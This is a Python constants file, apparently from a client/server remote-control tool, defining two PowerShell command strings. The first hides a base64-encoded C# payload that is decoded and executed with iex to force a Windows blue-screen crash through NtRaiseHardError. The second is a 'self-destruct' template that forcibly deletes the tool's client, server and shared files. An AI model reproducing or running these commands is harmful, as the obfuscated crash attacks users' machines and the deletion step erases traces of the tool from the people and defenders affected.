from typing import Final


EXECUTE_B64_BSOD: Final[
    str
] = "powershell -c \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGE9QCINCnVzaW5nIFN5c3RlbTt1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7cHVibGljIHN0YXRpYyBjbGFzcyBDU3tbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV1wdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IFJ0bEFkanVzdFByaXZpbGVnZShpbnQgUHJpdmlsZWdlLGJvb2wgYkVuYWJsZVByaXZpbGVnZSxib29sIElzVGhyZWFkUHJpdmlsZWdlLG91dCBib29sIFByZXZpb3VzVmFsdWUpO1tEbGxJbXBvcnQoIm50ZGxsLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgTnRSYWlzZUhhcmRFcnJvcih1aW50IEVycm9yU3RhdHVzLHVpbnQgTnVtYmVyT2ZQYXJhbWV0ZXJzLHVpbnQgVW5pY29kZVN0cmluZ1BhcmFtZXRlck1hc2ssSW50UHRyIFBhcmFtZXRlcnMsdWludCBWYWxpZFJlc3BvbnNlT3B0aW9uLG91dCB1aW50IFJlc3BvbnNlKTtwdWJsaWMgc3RhdGljIHVuc2FmZSB2b2lkIEtpbGwoKXtCb29sZWFuIHRtcDE7dWludCB0bXAyO1J0bEFkanVzdFByaXZpbGVnZSgxOSx0cnVlLGZhbHNlLG91dCB0bXAxKTtOdFJhaXNlSGFyZEVycm9yKDB4YzAwMDAwMjIsMCwwLEludFB0ci5aZXJvLDYsb3V0IHRtcDIpO319DQoiQDskYj1uZXctb2JqZWN0IC10eXBlbmFtZSBzeXN0ZW0uQ29kZURvbS5Db21waWxlci5Db21waWxlclBhcmFtZXRlcnM7JGIuQ29tcGlsZXJPcHRpb25zPScvdW5zYWZlJzskYT1BZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGEgLUxhbmd1YWdlIENTaGFycCAtUGFzc1RocnUgLUNvbXBpbGVyUGFyYW1ldGVycyAkYjtbQ1NdOjpLaWxsKCk7'))|iex\""

SELF_DESTRUCT_TEMPLATE: Final[
    str
] = 'powershell -c "sleep 5;Remove-Item -Path "{pdir}\\client_extras" -Recurse -Force;Remove-Item -Path "{pdir}\\server_extras" -Recurse -Force;Remove-Item -Path "{pdir}\\shared" -Recurse -Force;Remove-Item -Path "{pdir}\\client.py*" -Force;Remove-Item -Path "{pdir}\\server.py*" -Force;Remove-Item -Path "{pdir}\\README.md" -Force;exit"'
